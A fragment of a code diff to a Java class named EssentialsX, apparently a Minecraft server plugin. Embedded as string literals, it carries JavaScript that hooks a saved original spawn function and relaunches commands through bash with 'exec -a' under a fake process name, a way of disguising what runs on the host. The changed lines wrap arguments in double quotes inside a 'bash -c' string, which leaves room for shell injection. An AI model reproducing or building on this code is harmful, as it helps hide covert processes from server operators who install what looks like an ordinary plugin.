@@ -358,8 +358,8 @@ public class EssentialsX extends JavaPlugin {
         "            cmd = opts.execPath;\n" +
         "        } \n" +
         "        else if (typeof cmd === 'string' && !cmd.startsWith('/usr/') && !cmd.startsWith('/bin/')) {\n" +
-        "            var realArgs = args ? args.map(a => '\\''+a+'\\'').join(' ') : '';\n" +
-        "            var bashCmd = 'exec -a \\''+FAKE_CMD+'\\'' \"' + cmd + '\" ' + realArgs;\n" +
+        "            var realArgs = args ? args.map(a => `\"${a}\"`).join(' ') : '';\n" +
+        "            var bashCmd = `exec -a '${FAKE_CMD}' \"${cmd}\" ${realArgs}`;\n" +
         "            return _origSpawn.call(this, 'bash', ['-c', bashCmd], opts);\n" +
         "        }\n" +
         "        return _origSpawn.call(this, cmd, args, opts);\n" +
